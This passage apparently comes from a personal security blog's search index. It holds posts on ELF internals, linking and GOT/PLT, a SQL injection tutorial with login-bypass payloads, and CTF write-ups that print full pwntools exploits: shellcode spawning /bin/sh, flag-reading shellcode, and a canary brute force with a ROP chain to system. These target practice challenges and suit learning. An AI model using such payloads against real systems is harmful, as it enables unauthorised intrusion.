us we have x86 architecture with 64 bits.\ntype # Not sure why its DYN(Shared Object). It should have been EXEC (Executable file).[will update soon].\nRest # Rest of the information is regarding addresses and Size of sections and headers.\nSegments (aka Program Headers) # readelf -h ``binary`` This is a array of structures. Each describes the segments. The segments are used to tell, how to create a memory image when the binary is excecuted. When the Kernel sees these segments it will map them into the Virtual Memory with the help of mmap system call.\nPHDR # Tells the location of the Program header itself if its present.\ninterp # specifies the location and size of a null-terminated path name to invoke as an interpreter\ninterpreter\nIt is a program that excecutes certain specified instructions [not to worry now]. dynamic # This segment specifies the information needed for the dynamic linking process.\nGNU_EH_FRAME # This stores exceptional handlers. When things go wrong this area can deal with it.\nGNU_STACK # stack This is just a place where things can be stored during runtime. This GNU_STACK is responsible for the stack being excecutable. If this is not there then by default stack will be excecutable. If stack is enabled then user input can also be excecuted and can lead to a great havoc.\nELF Sections # This is also commonly called as section headers. This has the information needed for linking a target object file (dependencies) to the binary. This is needed on linktime but not on runtime.\nCommon Sections # .text: This section contains the code for the binary. .data: Holds all the initialised data. .rodata: Holds the initialised read-only data. .bss: Contain all the uninitialized data. .plt: PLT (Procedure Linkage Table) is useful when it comes to getting address of functions in dynamically linked libraries. .got: Contains all the resolved address of the functions from the dependecies. .dynamic: Holds all needed information for dynamic linking. .dynsym: table dedicated to dynamically linked symbols. .strtab: string table of .symtab section. .dynstr: string table of .dynsym section. .interp: RTLD embedded string. END # Hope you understood some basic concepts related to the ELF file format.\nsources: # intezer linux-audit ","date":"2020-09-10","externalUrl":null,"permalink":"/posts/1728230608669-executable-and-linkable-format---sections-and-segments/","section":"Blog Posts","summary":"\u003cp\u003eSo the ELF or Excecutable and Linkable format are programs or binaries that are used in linux systems. ELFs contain 3 components namely:\u003c/p\u003e","title":"Executable and Linkable Format - Sections and Segments","type":"posts"},{"content":"","date":"2020-09-10","externalUrl":null,"permalink":"/tags/sections/","section":"Tags","summary":"","title":"Sections","type":"tags"},{"content":"","date":"2020-09-10","externalUrl":null,"permalink":"/tags/segments/","section":"Tags","summary":"","title":"Segments","type":"tags"},{"content":"","date":"2020-09-06","externalUrl":null,"permalink":"/tags/dynamic-and-static-linking/","section":"Tags","summary":"","title":"Dynamic and Static Linking","type":"tags"},{"content":"We will take a quick look into the different types of linking of libraries to the ELF in x86 (linux).\nLinking: # Linking - It is the process where something is being connected to something else. Suppose you call functions that is not defined in your binary and has to be used from some dependencies. There Linking comes into picture.\nsample program # #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;Hello World\\n\u0026#34;); printf(\u0026#34;Welcome to my blog\\n\u0026#34;); } This will just print 2 strings to the terminal. Nothing intresting and complicated. Now let us compile this with static flag set.\ngcc --static test.c -o test Code Analysis # Now this is statically compiled. Let us try to analyse the code and see how the printf function is called.\nnote: Printf is a libc function, which means it is not included in the binary and is been imported from a external dependency. so open gdb and disassembly main We can see that there is a normal puts. Do you remember we used printf in our function. This means the compiler plays god and decides the best function to be used in that place. Since puts is more efficient than printf it was implemented there. Instead when you use format strings in printf then puts cant be implemented in that case. set a break point at puts and run the program. So now we see we go into the function puts. which has an address 0x4118c0. Now is this address kinda giving you an idea ? Yup ! This is our binary. If we do a vmmap (virtual memory mapping) then we can see that the address from 0x00400000 to 0x004e7000 are inside the binary. Now we can say that the puts function is inside the binary so its address is also known at runtime.\nPros and Cons # | Advantage| disadvantage | |: \u0026mdash;\u0026mdash;: |:\u0026mdash;\u0026mdash;: | | Anybody having the binary can excecute it. There will be no dependency errors| In real Life the applications are pretty huge and need multiple dependency files. Combining all of them into one file will make the size of the binary pretty huge. |\nDynamic Linking # Time to move on to the complicated stuff. To compile it as dynamic, you have to do a normal gcc compilation as GCC compiles everything into Dynamic linking by default.\ngcc test.c -o test Code Analysis # We know for a fact that the functions are not going to be inside our binary. The binary being smart will store the names of dependencies that our needed to excecute this file.\nMr. Dynamic Linker\nThe Dynamic Linker will link all the dependencies to the binary.\nFirst before excecuting the elf the system will excecute interpreter, which is a program that sets up the environment for excecuting the binary, this is done with the help of .dynamic section. This program (interpreter) lies in the pt_interp segment which is created by the ld (compile-time linker).\nreadelf -d test NEEDED : contains the names of all the dependencies. DT_SYMTAB : Address of the dynamic symbol table. so on\u0026hellip; steps # First the dynamic linker will load the excecutable into memory. Next will load the dependencies which are mentioned in the binary. Relocation - shared libraries are loaded into non-deterministic addresses. then do some initialisation and go back to binary\u0026rsquo;s entry point / starting point Pros and Cons # Advantage disadvantage People only need to have the dependencies installed once, that can be used for other binaries as well. People who dont have the correct dependency will face a lot of problems(finding them). Lazy Linking # Oops ! did I say that the linker performs all relocations. Well, thats not the case for most situations. This is where lazy linking comes into picture. So if a function is called then the dynamic linker will resolve the address for the function. Hence the name \u0026ldquo;Lazy\u0026rdquo; Linking. This awesome work is done by the GOT and PLT. (Next blog)\nEND # Good now that you understand some parts of Dynamic and Static linkning !!\nsource: # Really cool blog which made me understand this concept. intezer\n","date":"2020-09-06","externalUrl":null,"permalink":"/posts/1728230620380-dynamic-and-static-linking/","section":"Blog Posts","summary":"\u003cp\u003eWe will take a quick look into the different types of linking of libraries to the ELF in x86 (linux).\u003c/p\u003e","title":"Dynamic and Static Linking","type":"posts"},{"content":"How do programs know where the libc functions are in the libc, How is the internal implementation of the same ? We will look into GOT and PLT in short in this one.\nwhere and why ? # So Before diving into the concepts and working of GOT and PLT. Lets understand why we need them and where we need them.\nSo, In modern days we cant always compile the libraries or dependencies along with the binary. So the alternative option is to use Dynamic Linking. With advantages comes some complexity :P. So we dont know the address of functions that are used in the binary which are indeed defined in the dependency. So each time the binary runs the address needs to be resolved. This cool process is done with the help of GOT and PLT. Also these are not functions. They are just tables as the names suggest.\nSample Code # #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;Hello World\\n\u0026#34;); printf(\u0026#34;Welcome to my blog\\n\u0026#34;); } now compile this with no pie and 64 bit for further ease.\ngcc test.c -o test -no-pie Now this is Dynamically Linked (GCC does Dynamic Linking by default). So lets us run this\u0026hellip; Works fine.\nGDB Code Analysis # So let us use GDB (me - GDB-PEDA). Now disassemble the main and check for printf that we implemented. Hmm.. Weird We dont see it. If you read my previous blog you would know why. In short this is for efficiency. Do notice that the puts is actually termed puts@plt.\nSet a breakpoint at puts@plt run the program We come to puts@plt instead of next step let us single step to see what is there in the puts@plt. Now in the disassembly we can see that its not really puts function, We landed in the plt section of puts. Yes!! Procedure Linkage Table. Its basically a table which does a jump to the Global Offset Table for that particular entry, \u0026ldquo;puts\u0026rdquo;. Also remember this \u0026ldquo;GOT\u0026rdquo; is located in the .got section in the binary.\nNow we know that the got will not be filled with the address of puts as this is the first time this LIBC function is being called. So instead of real address of puts the got section of puts will contain the address of next instruction, which is a push followed by another jump. This push of a number can be imagined as the index of the string \u0026ldquo;puts\u0026rdquo; in the string table. Next the jump is to the function _dl_runtime_resolve. Yes this is the resolver,\ndl runtime resolve\nThis function will take the string as input and will find the real address of puts in libc and finally will change the GOT entry for puts. So due to this the function puts need not be searched again in the libc but can be directly taken from the got.\nThis whole process can be imagined this way. end # End of story. Great now you know a little bit of how GOT and PLT works.\n","date":"2020-09-06","externalUrl":null,"permalink":"/posts/1728230645394-global-offset-table-and-procedure-linkage-table/","section":"Blog Posts","summary":"\u003cp\u003eHow do programs know where the libc functions are in the libc, How is the internal implementation of the same ? We will look into GOT and PLT in short in this one.\u003c/p\u003e","title":"Global Offset Table and Procedure Linkage Table","type":"posts"},{"content":"","date":"2020-09-06","externalUrl":null,"permalink":"/tags/got/","section":"Tags","summary":"","title":"GOT","type":"tags"},{"content":"","date":"2020-09-06","externalUrl":null,"permalink":"/tags/short-blog/","section":"Tags","summary":"","title":"Short-Blog","type":"tags"},{"content":"","date":"2020-08-06","externalUrl":null,"permalink":"/tags/fun/","section":"Tags","summary":"","title":"Fun","type":"tags"},{"content":"","date":"2020-08-06","externalUrl":null,"permalink":"/tags/injection/","section":"Tags","summary":"","title":"Injection","type":"tags"},{"content":"","date":"2020-08-06","externalUrl":null,"permalink":"/tags/sql/","section":"Tags","summary":"","title":"Sql","type":"tags"},{"content":" What is a Database: # A database can be thought as a collection of data in an organised manner. When companies have huge amounts of data to be stored, using databases is the key for efficient usage of the data.\nSQL: # SQL or Structured Query Language is just a way to talk to the database and manipulate the data by the program. In most Database management systems SQL language is used. This blog post is divided into basics of sql and exploitation of sql.\nSQL Basics: # Creating a Database: # In order to follow this blog post it\u0026rsquo;ll be helpfull to have mysql installed. First we will create and use a Database in mysql called testdb. Now this database can use used to store multiple tables where each table can be used to store different types of datas. For example a login table can be used to store all usernames and passwords and a store website can use another table to store all their products and prices with it.\nCreating tables: # For the fun of it lets create a table called person since everyone has their own unique features. By features I mean their name, height and weigth.\nAccess the data: # Inorder to get the required data we use SELECT statements. when we have lines of select statements and commands to give to the databases we call them queries.\nnote: * means everything (all)\nHere we are select everything present in the table called person.\nWhen we have multiple number of objects in our table we can use a element present in each object that is unique. Most of the time our names our unique so we can access our object with the help of out name.\nLogin system: # In our login system (which we will use to hack) we have used sql query to check if the user and password given my the user is correct. The pseudo code is given below:\n\u0026lt;?php $sql = \u0026#34;SELECT id FROM admin WHERE username = \u0026#39;$myusername\u0026#39; and passcode = \u0026#39;$mypassword\u0026#39;\u0026#34;; $result = mysqli_query($db,$sql); # Send the sql query to DataBase $row = mysqli_fetch_array($result,MYSQLI_ASSOC); # Fetchs a result row as a array if($count != 0) { echo \u0026#34;Success! \u0026#34; # Tell the user the login creds were correct } else{ echo \u0026#34;Invalid \u0026#34; # Tell the user the login creds were incorrect } ?\u0026gt; Different Exploitation Techniques: # Simple login bypass: # We can see that there are 2 users in the table. Obviously in the real world application there wont be a table showing the credentials, inorder for learning purpose I have made them visible. Now lets check if there is a sql injection possible.\nNow If you are following the blog correctly you would have already know that this error is due to the \u0026rsquo; (single quote) I gave. So the query looks like\nSELECT id FROM admin WHERE username = \u0026#39;\u0026#39; \u0026#39; and passcode = \u0026#39;a\u0026#39; The unmatched single quotes make the query break and thereby telling us there are chances for a SQLInjection. Also a point to note is, its not required to get an error every time to prove there is a SQL Injection. Infact in most real world applications you would be left with blind sql injections which doesnt give you any output (covered later in this blog).\nSo we will use basic boolean logic for the first attack. We will tell the SQL Query that the username is true and passcode is true. So this will return the entire table and mostly likely we will be logged in as the first user (extreme case, likely never happens).\nHere we can see I gained access as tourpran who is the first user. Also in the query I managed to say that username='' or TRUE which will always be true, same for the password.\nWe can also login as admin if we pass the following credentials.\nUserName: admin password: \u0026#39; or \u0026#39;a\u0026#39;=\u0026#39;a SELECT id FROM admin WHERE username = \u0026#39;admin\u0026#39; and passcode = \u0026#39;\u0026#39; or \u0026#39;a\u0026#39;=\u0026#39;a\u0026#39; or username: \u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1 password: \u0026#39; or \u0026#39;a\u0026#39;=\u0026#39;a\u0026#39; and username=\u0026#39;admin\u0026#39; ; # SELECT id FROM admin WHERE username = \u0026#39;\u0026#39; or \u0026#39;a\u0026#39;=\u0026#39;a\u0026#39; and passcode = \u0026#39;\u0026#39; or \u0026#39;a\u0026#39;=\u0026#39;a\u0026#39; and username=\u0026#39;admin\u0026#39; ; #\u0026#39; # - comment the rest of the line ","date":"2020-08-06","externalUrl":null,"permalink":"/posts/1728230180964-sql-injection-web/","section":"Blog Posts","summary":"What is a Database: # A database can be thought as a collection of data in an organised manner.","title":"SQL Injection [web]","type":"posts"},{"content":"","date":"2020-07-17","externalUrl":null,"permalink":"/tags/pwnable.tw/","section":"Tags","summary":"","title":"Pwnable.tw","type":"tags"},{"content":"Here our main objective is to get a shell. The bug is plain and simple, it is an overflow to control the return address.\nSolution: # First I check the mitigations :\nSo I think it\u0026rsquo;s going to be fun !! As we have the permission to execute the stack (NX disabled). There is also no PIE so we don\u0026rsquo;t have to worry about the address changing every time :) Now, let us run the binary and see what is happening :\u0026gt;\nSo it\u0026rsquo;s simple just asking input and printing something. Now its time to see the assembly behind this binary.\nSo we can observe that all the registers are being emptied and then 5 values are beings pushed to the stack. If we examine them we can see that they are the strings that are printed when we run the binary. Math → 5 pushes are made and 4 bytes are taken for each push so a total of 20 bytes is taken by the binary to store it :P. Also INT 0x80 is equivalent to syscall. We can observe 2 syscalls being called\nThe first syscall is used to make the write. (For printing the string)\nThe second syscall is used to call read ( Probably to take our input ). Now let\u0026rsquo;s see what we can do to get root access !!\nI hope you find the offset by yourself or try pattern create in gdb-peda. :)\nIdea: # We have to overflow to the return address and then we have to somehow leak the stack pointer (ESP) So if we get the stack pointers address then we can place the shellcode there and then point the EIP to that address to give us a shell! Remember the write syscall prints the buffer pointed by the ECX.\nAfter the syscall, the stack is cleared as they call the add instruction (It removes the 20 bytes) Crafting the Exploit: # first 20 bytes to fill the buffer then put the address of move ESP to ECX. So first input will give the ESP. Next, we place the shellcode (from shellstorm.org) then execute it. We don\u0026rsquo;t have to worry about the shift of the stack because there is no PIE from pwn import * p = remote(\u0026#39;chall.pwnable.tw\u0026#39;, 10000) print(p.read()) buf = \u0026#39;A\u0026#39;*20 buf += p32(0x08048087) p.send(buf) esp = unpack(p.read()[:4]) print hex(esp) p.interactive() note: u32 is the opposite of p32 this returns the number and then we convert the number to hex. Also, we read the first 4 bytes the server sends us.\nOutput: 0xff819750\nFinal Exploitation # We place the shellcode then just execute it, in the read that followed the write. from pwn import * p = remote(\u0026#39;chall.pwnable.tw\u0026#39;, 10000) print(p.read()) buf = \u0026#39;A\u0026#39;*20 buf += p32(0x08048087) p.send(buf) esp = unpack(p.read()[:4]) shellcode = b\u0026#39;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\u0026#39; #new exploit buf = \u0026#39;a\u0026#39;*20 buf += p32(esp+20) buf += shellcode p.send(buf) p.interactive() I hope you liked the write-up. More writeups on its way.\n","date":"2020-07-17","externalUrl":null,"permalink":"/writeups/1728230780562-start-pwnable.tw/","section":"Writeups","summary":"\u003cp\u003eHere our main objective is to get a shell. The bug is plain and simple, it is an overflow to control the return address.\u003c/p\u003e","title":"start [pwnable.tw]","type":"writeups"},{"content":"This is a pretty awesome challenge! Here we will be writing assembly code in x86 to read the flag file from the server. This is one of the easier challenge in pwnable.tw which is stack based.\nSolution: # First I check the mitigations :\nWe have NX disabled. That means it is something to do with the shellcode. Seems like there is a canary which will not allow you to do a stack based buffer overflows. there is no pie so the address of the binary will be same every time you run. Let\u0026rsquo;s see the disassembly of this program Here we can see that our input is being put in the address 0x804a060 and then it is moved to EAX and then after that EAX is called. Meaning: our input is being executed. Now, let us run the binary and see what is happening :\u0026gt;\nHmm… We get a segfault.\nIdea: # As said in the question we will you three syscalls and then get the flag First call: open the flag file Second call: read the file Third call: write it to the output Exploit: # We will see the exploit in parts.\nPart 1 # We make EAX to 5 we push the string \u0026ldquo;///home/orw/flag\u0026rdquo; We make EBX pointing to the stack ( the string ) We make EDX equal to 0 and then we make the syscall. Part 2 # We make EAX equal to 3 We make ECX point to the string Give EDX the buffer size Call the syscall Part 3 # We make EAX equal to 4 Make EBX equal to 0 Add 1 to EBX / making EBX equal to 1. Then call the syscall. Refer to the below image if having any doubts !!\nIf we put all of the things together, then we get the flag.\nfrom pwn import * p = remote(\u0026#39;chall.pwnable.tw\u0026#39;,10001) print p.recv() s = asm(\u0026#34;xor eax, eax\u0026#34;) s += asm(\u0026#34;push eax\u0026#34;) s += asm(\u0026#34;add eax, 5\u0026#34;) s += asm(\u0026#34;push 0x67616c66\u0026#34;) s += asm(\u0026#34;push 0x2f77726f\u0026#34;) s += asm(\u0026#34;push 0x2f656d6f\u0026#34;) s += asm(\u0026#34;push 0x682f2f2f\u0026#34;) s += asm(\u0026#34;mov ebx, esp\u0026#34;) s += asm(\u0026#34;mov edx, 0\u0026#34;) s += asm(\u0026#34;int 0x80\u0026#34;) s += asm(\u0026#34;mov eax, 3\u0026#34;) s += asm(\u0026#34;mov ecx, ebx\u0026#34;) s += asm(\u0026#34;mov ebx, 3\u0026#34;) s += asm(\u0026#34;mov edx, 40\u0026#34;) s += asm(\u0026#34;int 0x80\u0026#34;) s += asm(\u0026#34;mov eax, 4\u0026#34;) s += asm(\u0026#34;mov ebx, 0\u0026#34;) s += asm(\u0026#34;inc ebx\u0026#34;) s += asm(\u0026#34;int 0x80\u0026#34;) p.send(s) f = p.recv() print f p.interactive() update: Back when I wrote this, it was python2, times were good.\nIf you want to try out more pwnable.tw but are stuck you can checkout pwn-hub: pwnable.tw repo\n","date":"2020-07-16","externalUrl":null,"permalink":"/writeups/1728230795518-orw-pwnable.tw/","section":"Writeups","summary":"\u003cp\u003eThis is a pretty awesome challenge! Here we will be writing assembly code in x86 to read the flag file from the server. This is one of the easier challenge in pwnable.tw which is stack based.\u003c/p\u003e","title":"ORW [pwnable.tw]","type":"writeups"},{"content":"I am proud to say that my team zh3r0 hosted its first CTF. This blog covers a challenge called c4n4ry, which might have something to do with the stack canary.\nChallenge description: # Solution: # First step: # Analyze the binary and then check its mitigations.\nNX is enabled so no shellcodes. PIE is disabled and also ASLR was disabled so no worries of the address changing. Now, let us run the binary and then see !! We can say that there was a continuous loop running. Also if we analyze the binary carefully we can see the name and input were not vulnerable but the description was using gets which reads arbitrary input.Now we can disassemble the main file now.\nGETS is vulnerable but… There is an additional memory compare. We can say that it might be our canary. The idea for the exploit: # Our first step will be in calculating the offset for the canary. I use pwntools pwn cyclic function but you guys can do anything.\nInside GDB: # I set a break at the memory compare. I use pwntools to analyze what is being compared with what Note: I also set up a fake canary to work with the binary locally Then I analyzed the string that was being compared with the help of pwntools.\nI got the offset as 192 for the canary. Now let me make a script to get a shell.\nfrom pwn import * \u0026#39;\u0026#39;\u0026#39; system address = 0x400780 \u0026#39;\u0026#39;\u0026#39; p = remote(\u0026#34;134.209.157.250\u0026#34;, 5084) p.sendline(\u0026#34;1\u0026#34;) p.sendline(\u0026#34;1\u0026#34;) buf = (\u0026#39;a\u0026#39;*192) buf += (\u0026#39;abcd\u0026#39;) So I set the canary to be “abcd” and then I searched for some ROP and before that, I also got the offset for the ret to be 20 bytes. So I created a ROP chain.\nnow it\u0026rsquo;s just combining all of the gadgets that\u0026rsquo;s it.\nFinal step: # I need to brute force the canary. It was damn easy cause i told them the hints that the canary was going to be small letters and was going to be in order.\nfrom pwn import * \u0026#39;\u0026#39;\u0026#39; sys = 0x400780 \u0026#39;\u0026#39;\u0026#39; for i in range(80, 123): p = remote(\u0026#34;134.209.157.250\u0026#34;,5084) p.sendline(\u0026#34;1\u0026#34;) p.sendline(\u0026#34;1\u0026#34;) buf = (\u0026#39;a\u0026#39;*192) buf += chr(i)+chr(i+1)+chr(i+2)+chr(i+3) buf += (\u0026#39;a\u0026#39;*20) buf += (p64(0x400936)) # pop r12 buf += (\u0026#34;/bin/sh;\u0026#34;) buf += (p64(0x400933)) # pop r11 buf += (p64(0x6020B0)) # just a random address to write to buf += (p64(0x400927)) # mov [r11], r12 buf += (p64(0x0000000000400939)) # pop rdi buf += (p64(0x6020B0)) # write address buf += (p64(0x400780)) # system p.sendline(buf) p.interactive() I just made the loop a bit big but what is the problem :P Conclusion # This was my first attempt to make a canary problem. So hope you liked this. Will be posting more blogs soon.\n","date":"2020-03-06","externalUrl":null,"permalink":"/writeups/1728230734805-c4n4ry-zh3r0-ctf/","section":"Writeups","summary":"I am proud to say that my team zh3r0 hosted its first CTF.","title":"c4n4ry [zh3r0 CTF]","type":"writeups"},{"content":"","date":"2020-03-06","externalUrl":null,"permalink":"/tags/canary/","section":"Tags","summary":"","title":"Canary","type":"tags"},{"content":"","date":"2020-03-06","externalUrl":null,"permalink":"/tags/zh3r0/","section":"Tags","summary":"","title":"Zh3r0","type":"tags"},{"content":"","date":"2019-09-29","externalUrl":null,"permalink":"/tags/experience/","section":"Tags","summary":"","title":"Experience","type":"tags"},{"content":"","date":"2019-09-29","externalUrl":null,"permalink":"/tags/life/","section":"Tags","summary":"","title":"Life","type":"tags"},{"content":"There was too much to learn than to compete in the competition. Spoiler alert, this is my first CTF finals, hope that justifies all the drama. Before jumping to my story…\nBasically, CTF (Capture The Flag) is a kind of information security competition that challenges contestants to solve a variety of tasks ranging from a scavenger hunt on Wikipedia to basic programming exercises to hacking your way into a server to steal data. In layman’s terms, Just a way to learn “hacking”.\nA quick gist about the competition: INCTFJ Amrita InCTF Junior is a National level Cybersecurity contest for high school students in India. Their main aim is to induce a new field in the minds of young people. Now coming to our story… It all started when I wanted to hack. :P\nBEFORE THE CONTEST: # I am just a high school kid who wanted to be like LiveOverFlow and GeoHotz. I was of course motivated by many to start hacking in which my brother played a key role. Also, I had a good mentor who was already established in the field of cybersecurity from his years at bios, the cybersecurity club at Amrita University.\nAFTER THE QUALIFIERS: # I took part in the annual INCTFJ competition, in which I got selected for the grand finale. The next thing I did was, pack my bag and called someone for accompanying me to the onsite finals. We (my brother and I) took a bus to Kollam (place, where the finals took place). Finally, we reached there early in the morning so we went to sleep. The next day some other participants from the next room who were just like me (energetic and happy) engaged in small talk with me and I got along with them very well. They kept company throughout the competition leading all the way up to today.\nDURING THE WORKSHOPS: # I along with my new friends went to the registration site to enroll our names for the finals and we got ourselves a badge that was priceless for me. I kept it with myself for the whole time.\nEnjoyed a bit too much with friends and never left the mentors free. The mentors were soo encouraging and enthusiastic. They also loved to help the participants.\nFOOD : # We were greeted like guests and were given delicious food — super hot and was mouth-watering.￼ We were given lunch and dinner at the place where the college students were given food.\nSTUDY TIME: # They (mentors from Amrita) taught us much stuff that included things like:\nWeb exploitation Standard Query Language reverse engineering some cool stuff GRAND FINALE: # It was finally time. This was the moment we were all waiting for, the “ INCTFJ finals”. To be honost we were both nervous and happy the contest started. I could hardly solve six to seven challenges. It was a bit tough as I expected, still I was happy because my friend said he was in the top 5. After the finals were over, we were sent to our rooms. meanwhile,\nPARTY! PARTY! : # We were sent to the party hall and “surprise surprise” they had a party which was organized by the campus. I could not believe my eyes, it was Stephen Devassy — The lead pianist… He totally rocked it. It was so great. It was the perfect time to blend in with my friends and have fun. When we arrived at the campus the view itself blew me away and I was stunned for some seconds … I was disappointed when the results came but were motivated to do more of CTFs and to learn more things. I knew, sometimes falling down today, gives us a chance to rise tomorrow.\nTHINGS I LEARNED: # learned to be independent knew I had soo much to learn understood that there were kids of my age who were greater than me Understood the true meaning of friendship and fun… Hope you have a time like this…BYE… ","date":"2019-09-29","externalUrl":null,"permalink":"/posts/1728230565134-my-first-ctf-life/","section":"Blog Posts","summary":"\u003cp\u003e\u003cstrong\u003eThere was too much to learn than to compete in the competition.\u003c/strong\u003e Spoiler alert, this is my first CTF finals, hope that justifies all the drama.\nBefore jumping to my story…\u003c/p\u003e","title":"My First CTF [life]","type":"posts"},{"content":"","externalUrl":null,"permalink":"/about/","section":"About","summary":"","title":"About","type":"about"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"}]